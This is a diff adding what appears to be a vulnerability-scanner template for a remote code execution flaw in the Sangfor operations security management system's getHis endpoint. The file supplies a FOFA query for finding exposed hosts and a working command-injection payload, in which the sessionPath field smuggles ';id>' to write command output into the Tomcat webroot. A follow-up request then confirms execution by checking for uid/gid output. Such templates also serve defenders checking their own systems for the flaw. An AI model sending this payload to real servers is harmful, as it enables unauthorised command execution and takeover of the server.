@@ -1,0 +1,35 @@
+## id: VEID-2026-11118
+## name: 深信服运维安全管理系统 getHis 远程代码执行漏洞
+## author: hack007x
+## severity: critical
+## tags: veid,rce,veid2026
+## description: 深信服运维安全管理系统 getHis 远程代码执行漏洞，攻击者可执行任意命令导致服务器被控。
+## affects: 深信服运维安全管理系统
+## fofa-query: body="/fort/login" && header="FORTSESSIONID"
+## verification: true
+
+
+
+POST /isomp-protocol/protocol/getHis HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+sessionPath=;id>/usr/local/tomcat/webapps/isomp-protocol/veil.txt;&sid=1
+
+
+#@ condition: and
+#@ matcher: header["Content-Type"] contains "plain"
+#@ matcher: status_code == 200
+
+---
+
+GET /isomp-protocol/veil.txt HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: and
+#@ matcher: body contains "uid=" && body contains "gid=" && body contains "groups="
+
+
+# @VEIL-STAMP: e42f3ca232255f5a6914f47e7911570d03b127b6e695e7684586a8ca12ced39c
